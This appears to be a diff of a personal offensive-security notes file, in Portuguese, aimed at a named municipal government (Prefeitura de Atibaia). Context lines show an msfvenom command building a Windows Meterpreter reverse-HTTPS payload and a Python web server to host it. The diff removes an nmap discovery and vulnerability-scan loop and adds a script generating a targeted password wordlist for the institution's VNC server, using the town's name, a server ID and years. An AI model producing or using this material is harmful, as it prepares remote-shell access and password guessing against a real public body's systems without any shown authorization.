@@ -6,22 +6,42 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-#!/bin/bash
+import itertools
 
-echo "Digite o IP ou faixa de rede (exemplo: 192.168.1.0/24): "
-read REDE
+# Criar uma lista de palavras-chave baseadas na Prefeitura de Atibaia e no servidor
+keywords = [
+    "atibaia", "sumas", "servidor", "prefeitura", "atibaia.gov", "SUMA57667", "admin", "governo", "municipio"
+]
 
-echo "Procurando hosts ativos..."
-nmap -sn $REDE -oN hosts_ativos.txt
-cat hosts_ativos.txt | grep "Nmap scan report for" | awk '{print $5}' > ips_encontrados.txt
+# Anos relevantes desde 2019
+years = [str(y) for y in range(2019, 2025)]
 
-for ip in $(cat ips_encontrados.txt)
-do
-    echo "Escaneando IP: $ip"
-    nmap -A -Pn -p- $ip -oN scan_$ip.txt
-    echo "Verificando vulnerabilidades no IP: $ip"
-    nmap --script vuln -Pn -p- $ip -oN vuln_$ip.txt
-done
+# Caracteres especiais comuns em senhas
+special_chars = ["@", "#", "!", "$", "123", "2024"]
 
-echo "Scan completo. Resultados salvos nos arquivos scan_<ip>.txt e vuln_<ip>.txt"
+# Gerar combinações de palavras-chave + anos + caracteres especiais
+wordlist = set()
+
+for keyword in keywords:
+    for year in years:
+        wordlist.add(keyword + year)
+        for char in special_chars:
+            wordlist.add(keyword + year + char)
+            wordlist.add(keyword.capitalize() + year + char)
+            wordlist.add(keyword.upper() + year + char)
+
+# Adicionar algumas variações extras comuns
+common_variations = [
+    "Atibaia@123", "Sumas#2024", "Pref@123", "Governo2024!", "Admin2023@", "Servidor#2020"
+]
+wordlist.update(common_variations)
+
+# Salvar a wordlist em um arquivo
+wordlist_path = "/mnt/data/wordlist_atibaia_vnc.txt"
+with open(wordlist_path, "w") as f:
+    for password in wordlist:
+        f.write(password + "\n")
+
+# Exibir o caminho do arquivo gerado
+wordlist_path
 
